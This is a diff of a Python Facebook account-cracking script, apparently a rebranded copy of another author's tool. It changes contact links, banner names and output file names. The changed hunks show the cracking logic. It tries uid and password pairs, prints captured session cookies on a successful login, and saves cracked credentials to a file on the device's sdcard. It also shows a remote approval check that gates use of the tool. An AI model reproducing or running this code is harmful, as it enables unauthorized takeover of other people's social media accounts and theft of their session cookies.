@@ -252,13 +252,13 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801790210942');time.sleep(1)
+		os.system('xdg-open https://wa.me/+923021431324');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://facebook.com/groups/735209235013629/');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://github.com/HRIDOYE-143');time.sleep(1)
+		os.system('xdg-open https://github.com/CyberAttack85/Cyber-Attack.git');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -344,10 +344,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [HRIDOYE-OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [UMAR-OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/HRIDOYE-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/UMAR-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -356,11 +356,11 @@ def b(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="HRIDOYE-"
+    UMO="Cyber-Attack"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/HRIDOYE-143/CONTROL-GITHUB/blob/main/Aproval.tex").text
+    DARK=requests.get("https://github.com/CyberAttack85/Cyber-Attack/blob/main/Aproval.tex").text
     if id in DARK:
         Main()
     else:
